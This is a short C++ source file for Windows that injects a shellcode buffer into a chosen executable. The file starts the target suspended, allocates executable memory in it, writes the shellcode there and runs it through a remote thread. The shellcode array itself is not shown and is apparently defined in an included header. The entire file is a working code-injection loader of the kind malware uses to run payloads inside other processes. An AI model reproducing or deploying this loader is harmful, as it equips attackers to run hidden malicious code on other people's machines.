#include "main.h"

bool Inject()
{
    // Open file dialog
    OPENFILENAMEW fm;
    ZeroMemory(&fm, sizeof(fm));
    wchar_t flnm[MAX_PATH];

    fm.lStructSize = sizeof(OPENFILENAMEW);
    fm.hwndOwner = nullptr;
    fm.lpstrFilter = L"Executable Files (*.exe)\0*.exe\0";
    fm.lpstrFile = flnm;
    fm.lpstrFile[0] = '\0';
    fm.nMaxFile = sizeof(flnm);
    fm.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
    fm.lpstrDefExt = L"";

    if (!GetOpenFileNameW(&fm))
        return false;

    // Create process in a suspended state
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    if (!CreateProcessW(fm.lpstrFile, nullptr, nullptr, nullptr, false, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi))
        return false;

    printf("CreateProcessW OK\n");

    // Allocate memory
    LPVOID lpAlloc = VirtualAllocEx(pi.hProcess, nullptr, ARRAYSIZE(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpAlloc)
        return false;

    printf("lpAlloc = 0x%p\n", lpAlloc);

    // Write memory
    if (!WriteProcessMemory(pi.hProcess, lpAlloc, shellcode, ARRAYSIZE(shellcode), nullptr))
        return false;

    printf("WriteProcessMemory OK\n");

    // Remote thread
    HANDLE hThread = CreateRemoteThread(pi.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpAlloc, nullptr, 0, nullptr);

    printf("hThread = 0x%p\n", hThread);

    // Resume thread
    if (ResumeThread(pi.hThread) == (DWORD)-1)
        return false;

    // Wait for thread
    if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
        return false;

    // Prevent leaks
    if (lpAlloc)
        VirtualFreeEx(pi.hProcess, lpAlloc, 0, MEM_RELEASE);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);
    if (hThread)
        CloseHandle(hThread);

    return true;
}

int main()
{
    Inject();

    getchar();

    return 0;
}